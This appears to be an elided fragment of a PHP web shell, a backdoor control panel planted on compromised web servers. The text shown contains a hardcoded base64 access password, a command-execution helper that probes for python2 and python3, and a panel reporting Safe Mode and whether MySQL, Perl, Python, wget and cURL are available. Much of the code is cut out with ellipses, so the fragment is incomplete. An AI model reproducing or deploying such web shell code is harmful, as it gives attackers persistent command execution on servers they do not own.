...
$gcw = "getcwd";
$inipass = "YjY0c2F5YW5nc2VrYWxp"; //tebaksendiri
if(isset($_7['_'])){
...
<html>
	...
	<style> 
body{ 
background-image:url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzMVvZVavKh6hpAJVTQl337paMUlhBV7H2vw&usqp=CAU); 
...
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			...
			$py2 = (exe('python2 --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$py3 = (exe('python3 --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
		...
		<div class='container-fluid'>
			...
			<div class='collapse text-dark mb-3' id='collapseExample'>
				...
				Safe Mode: $sm<br>
				MySQL: $sql | Perl: $pl | Python: $py | Python2: $py2 | Python3: $py | WGET: $wget | cURL: $curl<br>
		...
		</div><div class='text-secondary'>&copy; 2020-<?=date('Y');?> 1337</div>
	</div>
</div>
</body>
</html>
